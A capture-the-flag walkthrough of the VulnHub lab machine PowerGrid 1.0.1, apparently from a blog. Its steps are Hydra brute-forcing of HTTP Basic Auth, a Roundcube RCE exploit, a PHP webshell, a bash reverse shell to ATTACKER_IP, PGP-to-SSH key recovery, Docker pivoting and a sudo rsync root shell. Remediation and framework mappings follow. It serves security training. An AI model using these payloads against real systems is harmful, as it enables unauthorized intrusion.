# PowerGrid: 1.0.1 — Hack the Grid Before It Hacks You

Dude, this machine is legit one of the most layered CTF experiences on VulnHub. PowerGrid: 1.0.1 is not a simple linear box. It's a full attack chain: HTTP Basic Auth brute-force on Roundcube webmail, authenticated RCE via EDB-40892, lateral movement through PGP decryption to recover an SSH key, Docker container pivoting, and finally root via sudo rsync GTFOBin. Every stage requires a distinct skill set. No cap, this one separates the "I know nmap" crowd from people who actually understand layered privilege escalation.

Big respect to the creator for building something that mirrors real-world infrastructure: webmail servers, Docker containers, network pivoting, and crypto all in one machine.

| Field | Value |
|---|---|
| **Level** | Hard |
| **Target VM** | PowerGrid: 1.0.1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/powergrid-101,485/ |
| **Techniques** | HTTP Basic Auth brute-force, Roundcube RCE (EDB-40892), PHP webshell, PGP decryption, Docker network discovery, SSH pivoting, sudo rsync GTFOBin |
| **CVEs** | CVE-2017-16651 (Roundcube RCE) |
| **APT Groups** | Sandworm (notorious for targeting energy/power infrastructure with layered intrusion chains); APT33 (OilRig, targets energy sector webmail and VPN systems as initial access vectors) |

---

## Attack Summary

```
nmap → HTTP (80), Roundcube webmail (HTTP Basic Auth protected)
  → Browse http://target/ → directory listing → usernames: deez1, p48, all2
  → dirsearch → /roundcube/ (HTTP Basic Auth)
  → hydra -L users.txt -P rockyou.txt → valid creds
  → Login Roundcube → EDB-40892 authenticated RCE
  → Upload webshell → reverse shell as www-data
  → find flags 1+2
  → su p48 (password reuse from webmail)
  → gpg --import p48 key → gpg --decrypt email → SSH private key
  → ip route → Docker bridge 172.17.0.0/16
  → ping sweep → docker container at 172.17.0.x
  → ssh -i recovered_key user@172.17.0.x → shell in container
  → sudo -l → (root) NOPASSWD: /usr/bin/rsync
  → sudo rsync GTFOBin → root
  → cat /root/flag3.txt /root/flag4.txt
```

---

## Methodology

1. Host discovery and full port scan
2. Web enumeration: discover username list and Roundcube webmail
3. HTTP Basic Auth brute-force with Hydra
4. Roundcube authenticated RCE (EDB-40892)
5. PHP webshell upload and reverse shell as www-data
6. Flag 1 collection
7. Lateral movement to p48 via password reuse
8. PGP decryption: recover SSH private key from encrypted email
9. Docker network discovery via ip route
10. SSH pivot into Docker container
11. Root escalation via sudo rsync GTFOBin
12. Flag 2, 3, 4 collection

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -i eth0
# Note target IP, add to /etc/hosts:
echo "192.168.56.x powergrid.vh" >> /etc/hosts

nmap -A -p- powergrid.vh
```

Key findings: an HTTP service on port 80 with directory listing enabled, and potentially other services. The web service exposes the attack surface.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration: Username Discovery

Browse to `http://powergrid.vh/`. The page contains a directory listing or explicit mention of three usernames:

- `deez1`
- `p48`
- `all2`

Save to a wordlist for brute-force:

```bash
echo -e "deez1\np48\nall2" > /tmp/users.txt
```

Run directory enumeration:

```bash
dirsearch -u http://powergrid.vh/ -e php,html,txt
# or: gobuster dir -u http://powergrid.vh/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A directory protected by HTTP Basic Authentication is discovered containing Roundcube webmail.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1592 — Gather Victim Host Information

---

## Step 3 — HTTP Basic Auth Brute-Force with Hydra

```bash
hydra -L /tmp/users.txt \
      -P /usr/share/wordlists/rockyou.txt \
      powergrid.vh \
      http-get /ROUNDCUBE_PATH/ \
      -t 16
```

Valid credentials found. Note them down for the next step.

**Alternative:** `medusa -h powergrid.vh -U /tmp/users.txt -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/ROUNDCUBE_PATH/ -m AUTH:BASIC`

**Real-world note:** HTTP Basic Auth is still in use on many internal corporate tools, legacy admin panels, and development environments. Without lockout policies, brute-force with rockyou.txt succeeds in minutes. APT33 has been observed brute-forcing webmail as primary initial access in energy sector campaigns.

**MITRE ATT&CK:** T1110.003 — Brute Force: Password Spraying; T1078 — Valid Accounts

---

## Step 4 — Roundcube RCE (EDB-40892)

Log in to Roundcube with the discovered credentials.

The Roundcube version is vulnerable to authenticated Remote Code Execution (Exploit-DB 40892). This vulnerability allows an authenticated user to execute arbitrary PHP code.

```bash
# Locate the exploit
searchsploit roundcube
searchsploit -m 40892

# Review and adapt the exploit
# The exploit typically creates a PHP file via the Roundcube spell-check API
```

Verify code execution by checking if a test file was created:

```bash
curl http://powergrid.vh/PATH/test.php
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Step 5 — PHP Webshell and Reverse Shell

Upload a PHP webshell via the RCE:

```bash
# Simple webshell
echo '<?php passthru($_GET["cmd"]); ?>' > /tmp/shell.php

# Verify execution
curl "http://powergrid.vh/PATH/shell.php?cmd=id"
# www-data
```

Upgrade to a full reverse shell:

```bash
# Start listener
nc -lvnp 4444

# URL-encoded bash reverse shell
curl "http://powergrid.vh/PATH/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

Stabilize:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

Check for initial flags:

```bash
find / -name "flag*" 2>/dev/null
cat /PATH/flag1.txt
```

**MITRE ATT&CK:** T1059.004 — Unix Shell; T1505.003 — Web Shell

---

## Step 6 — Lateral Movement to p48 via Password Reuse

Check the Roundcube inbox for the authenticated user. There is a PGP-encrypted email in the inbox.

Try switching to user `p48` using the webmail password (password reuse):

```bash
su p48
# Enter the webmail password
```

Switch succeeds. Password reuse between webmail and system accounts is the bridge to the next stage.

```bash
ls -la /home/p48/
# .gnupg/ directory present
# pgp_message.asc — encrypted email
```

**MITRE ATT&CK:** T1078.003 — Valid Accounts: Local Accounts; T1552.001 — Credentials in Files

---

## Step 7 — PGP Decryption to Recover SSH Key

Import the GPG private key for p48:

```bash
gpg --import /home/p48/.gnupg/private-key.asc
```

Decrypt the PGP email (passphrase is the same webmail/system password):

```bash
gpg --decrypt /home/p48/pgp_message.asc
# Or wherever the encrypted message is stored
# Enter passphrase when prompted
```

The decrypted output contains an SSH private key. Save it:

```bash
# On attacker machine, save the key output
vim /tmp/docker_id_rsa
# Paste the private key
chmod 600 /tmp/docker_id_rsa
```

**Real-world note:** GPG encryption is often used to protect sensitive materials, but when the passphrase is the same as a known credential (password reuse), the encryption provides no real security. Sandworm used similar credential chain techniques in several ICS/SCADA intrusions where one compromised credential unlocked multiple protected artifacts.

**MITRE ATT&CK:** T1552.004 — Credentials in Files: Private Keys; T1600 — Weaken Encryption

---

## Step 8 — Docker Network Discovery

From the www-data or p48 shell, discover the Docker bridge network:

```bash
ip route
# Look for Docker bridge: e.g., 172.17.0.0/16
```

Perform a quick ping sweep to find the Docker container:

```bash
for i in $(seq 1 10); do
  (ping -c1 -W1 172.17.0.$i &>/dev/null && echo "172.17.0.$i up") &
done
wait
```

Identify the container IP (usually 172.17.0.2 or similar).

**Alternative:** If `nmap` is available on the target: `nmap -sn 172.17.0.0/24`

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1599 — Network Boundary Bridging

---

## Step 9 — SSH Pivot into Docker Container

From the attacker machine (or via the shell on the host using the key):

```bash
ssh -i /tmp/docker_id_rsa user@172.17.0.x
```

A shell opens inside the Docker container. Read flags inside the container:

```bash
find / -name "flag*" 2>/dev/null
cat /PATH/flag2.txt
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1610 — Deploy Container

---

## Step 10 — Root Escalation via sudo rsync GTFOBin

Inside the Docker container, check sudo permissions:

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/rsync
```

Use the GTFOBins `rsync` technique to spawn a root shell:

```bash
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

Root shell obtained inside the container. Read the final flags:

```bash
id
# uid=0(root) gid=0(root)

cat /root/flag3.txt
cat /root/flag4.txt
```

(☞ﾟヮﾟ)☞ Root. All 4 flags captured.

**Real-world note:** `sudo rsync` without a password restriction is a well-documented GTFOBins vector. It's the kind of configuration that gets set during initial Docker container setup for "convenience" and never reviewed. Sandworm and APT28 both leverage legitimate system tools for privilege escalation to avoid triggering AV/EDR signatures.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo; T1218 — System Binary Proxy Execution

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | deez1/p48/all2 usernames | Web directory listing | Brute-force targeting |
| Credential | (webmail creds) | Hydra brute-force against HTTP Basic Auth | Roundcube login |
| Credential | p48 system password | Same as webmail password (reuse) | su p48 |
| SSH Key | Docker container private key | PGP-decrypted email | SSH into Docker container |
| Flag 1 | (varies) | Web root after RCE | Captured via shell |
| Flag 2 | (varies) | Docker container filesystem | Captured via SSH pivot |
| Flag 3 | (varies) | /root/ in container | Captured after sudo root |
| Flag 4 | (varies) | /root/ in container | Captured after sudo root |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | HTTP Basic Auth brute-force: no lockout policy | Energy sector and industrial control networks routinely use HTTP Basic Auth on legacy web interfaces | Implement account lockout; require strong unique credentials; add IP-based rate limiting |
| 2 | Roundcube RCE (EDB-40892): outdated webmail | Webmail servers are high-value initial access targets; unpatched versions are consistently exploited | Maintain webmail platforms on current versions; isolate webmail from internal networks |
| 3 | Password reuse: webmail password = system user password = PGP passphrase | One compromised password unlocked three different authentication layers | Enforce unique passwords per service; use a password manager; MFA on all accounts |
| 4 | PGP passphrase same as known credential | Encrypted artifacts are only as secure as their passphrase | Use strong, unique passphrases for cryptographic material; separate from system passwords |
| 5 | Docker container network accessible from host | Container network isolation failures allow lateral movement from host to containers | Enforce network policies; isolate Docker bridge networks; use separate VLANs for containers |
| 6 | sudo rsync NOPASSWD in container | GTFOBins documents rsync as a root shell vector | Remove NOPASSWD sudo entries; require passwords; restrict to specific, safe commands |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Initial Access | Initial Access | Brute Force: Password Spraying | T1110.003 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | Execution | Server Software Component: Web Shell | T1505.003 |
| Credential Access | Credential Access | Valid Accounts: Local Accounts | T1078.003 |
| Credential Access | Credential Access | Credentials in Files: Private Keys | T1552.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Lateral Movement | Lateral Movement | Network Boundary Bridging | T1599 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Update Roundcube webmail** to a patched version; remove EDB-40892 attack surface
2. **Enforce account lockout** on HTTP Basic Auth (Fail2ban or equivalent)
3. **Enforce unique passwords per service** for all users; deploy a password manager
4. **Isolate Docker bridge networks** from host and from each other using network policies
5. **Remove NOPASSWD sudo entries** in all containers; require passwords for all sudo usage
6. **Audit GPG passphrases** to ensure they differ from system credentials

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory webmail, Docker containers, and internal services |
| Protect | Access Control | Implement lockout; enforce unique credentials; MFA on webmail |
| Protect | Identity Management | Separate passphrases from system passwords |
| Detect | Anomalies and Events | Alert on HTTP Basic Auth brute-force attempts; monitor Docker network traffic |
| Respond | Response Planning | Isolate compromised containers; rotate all credentials |
| Recover | Recovery Planning | Rebuild compromised containers; review all sudo configurations |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-7 | Unsuccessful Login Attempts | Account lockout after failed HTTP Basic Auth attempts |
| AC-6 | Least Privilege | Remove NOPASSWD sudo from containers |
| IA-5 | Authenticator Management | Unique passwords per service; strong PGP passphrases |
| SC-7 | Boundary Protection | Isolate Docker bridge networks; enforce network segmentation |
| CM-7 | Least Functionality | Restrict services exposed on Docker bridge networks |
| SI-2 | Flaw Remediation | Patch Roundcube to current version |

### CISA KEV

Roundcube webmail vulnerabilities are referenced in CISA Alert AA24-015A (threat actor exploitation of webmail systems). Organizations should ensure webmail is not reachable from untrusted networks and patched to current versions per CISA guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Credentials | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Situational Awareness (SITUATION) | Perform Logging | MIL2 |

### MITRE D3FEND

- **D3-NTA** — Network Traffic Analysis (monitor Docker bridge network for unusual SSH connections)
- **D3-ACH** — Application Configuration Hardening (enforce lockout; update Roundcube)
- **D3-OAM** — Operating System Administrative Management (sudo restrictions in containers)

---

## Final Thoughts

PowerGrid: 1.0.1 is a masterpiece of layered complexity. Every single stage requires you to actually understand what you're doing, not just run a tool and hope. The PGP-to-SSH chain is particularly clever: it tests whether you understand cryptographic key management in addition to network pivoting. The Docker container angle mirrors exactly what defenders see in modern cloud and containerized infrastructure.

If you completed this machine: you now have hands-on experience with webmail exploitation, cryptographic credential recovery, Docker network pivoting, and GTFOBins privilege escalation. That's a serious skill stack, fr fr.

GG dude, that was a grind and you earned it. (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧

Thanks guys!! (❍ᴥ❍ʋ)
